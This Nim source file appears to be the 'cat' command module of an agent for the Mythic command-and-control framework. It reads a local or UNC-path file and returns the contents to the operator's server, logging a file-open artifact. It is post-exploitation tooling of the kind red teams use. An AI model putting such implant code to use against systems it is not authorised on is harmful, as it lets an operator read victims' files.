import ../utils/mythic_responses
import ../utils/debug
import std/[json, strformat, os, strutils]

type
  CatArgs = object
    path: string

proc catFile*(taskId: string, params: string): JsonNode =
  
  # Parse arguments
  let args = parseJson(params).to(CatArgs)
  
  debug "[DEBUG] Reading file: ", args.path
  
  try:
    # Handle UNC paths (\\server\share) and absolute paths
    let fullPath = if args.path.startsWith("\\\\") or isAbsolute(args.path):
      args.path
    else:
      getCurrentDir() / args.path
    
    # Check if file exists
    if not fileExists(fullPath):
      return mythicError(taskId, &"File not found: {fullPath}")
    
    # Read file contents
    let content = readFile(fullPath)
    
    debug &"[DEBUG] Read {content.len} bytes from {fullPath}"
    
    # Create response with artifact
    var response = mythicSuccess(taskId, content)
    response["artifacts"] = %* [
      {
        "base_artifact": "FileOpen",
        "artifact": fullPath
      }
    ]
    
    return response
    
  except IOError as e:
    return mythicError(taskId, &"Failed to read file: {e.msg}")
  except Exception as e:
    return mythicError(taskId, &"Error: {e.msg}")
